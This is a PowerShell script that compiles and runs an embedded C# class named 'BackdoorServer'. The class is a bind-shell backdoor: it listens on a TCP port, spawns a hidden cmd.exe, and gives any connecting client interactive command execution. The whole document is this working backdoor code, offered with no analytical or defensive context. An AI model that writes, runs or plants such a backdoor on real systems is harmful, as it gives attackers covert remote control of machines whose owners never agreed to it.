$easybind = @"
using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.IO;
namespace BackdoorServer
{
    public class Backdoor
    {
        private TcpListener listener;
        private Socket mainSocket;
        private int port;
        private String name;
        private bool verbose;
        private Process shell;
        private StreamReader fromShell;
        private StreamWriter toShell;
        private StreamReader inStream;
        private StreamWriter outStream;
        private Thread shellThread;
        public static void _bind(string ip, Int32 port)
        {
            Backdoor bd = new Backdoor();
            bd.startServer(ip,port);
        }
        public void startServer(string ns,int porta, bool verb=false)
        {
            try
            {
                name = ns;
                port = porta;
                verbose = verb;
                IPAddress ip = IPAddress.Parse(ns);


                if (verbose)
                    Console.WriteLine("Listening on port " + port);
listener = new TcpListener(ip, port);
listener.Start();
                mainSocket = listener.AcceptSocket();

                if (verbose)
                    Console.WriteLine("Client connected: " + mainSocket.RemoteEndPoint);
Stream s = new NetworkStream(mainSocket);
inStream = new StreamReader(s);
outStream = new StreamWriter(s);
outStream.AutoFlush = true;     
                shell = new Process();
shell.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                ProcessStartInfo p = new ProcessStartInfo("cmd");
p.WindowStyle = ProcessWindowStyle.Hidden;
                p.CreateNoWindow = true;
                p.UseShellExecute = false;
                p.RedirectStandardError = true;
                p.RedirectStandardInput = true;
                p.RedirectStandardOutput = true;
                shell.StartInfo = p;
                shell.Start();
                toShell = shell.StandardInput;
                fromShell = shell.StandardOutput;
                toShell.AutoFlush = true;
                shellThread = new Thread(new ThreadStart(getShellInput));
                shellThread.Start();
                outStream.WriteLine("Welcome to " + name + " backdoor server.");
                outStream.WriteLine("Starting shell...\n");
                getInput();
dropConnection();

            }
            catch (Exception) { dropConnection(); }
        }
        void getShellInput()
{
    try
    {
        String tempBuf = "";
        outStream.WriteLine("\r\n");
        while ((tempBuf = fromShell.ReadLine()) != null)
        {
            outStream.WriteLine(tempBuf + "\r");
        }
        dropConnection();
    }
    catch (Exception) {}
}
private void getInput()
{
    try
    {
        String tempBuff = "";
        while (((tempBuff = inStream.ReadLine()) != null))
        { 
            if (verbose)
                Console.WriteLine("Received command: " + tempBuff);
            handleCommand(tempBuff);
        }
    }
    catch (Exception) { }
}

private void handleCommand(String com)
{
    try
    {
        if (com.Equals("exit"))
        {
            outStream.WriteLine("\n\nClosing the shell and Dropping the connection...");
            dropConnection();
        }
        toShell.WriteLine(com + "\r\n");
    }
    catch (Exception) { dropConnection(); }
}
private void dropConnection()
{
    try
    {
        if (verbose)
            Console.WriteLine("Dropping Connection");
        shell.Close();
        shell.Dispose();
        shellThread.Abort();
        shellThread = null;
        inStream.Dispose();
        outStream.Dispose();
        toShell.Dispose();
        fromShell.Dispose();
        shell.Dispose();
        mainSocket.Close();
        listener.Stop();
        return;
    }
    catch (Exception) { }
}    
    }
}
"@

Add-Type -TypeDefinition $easybind
[BackdoorServer.Backdoor]::_bind("127.0.0.1","4444")
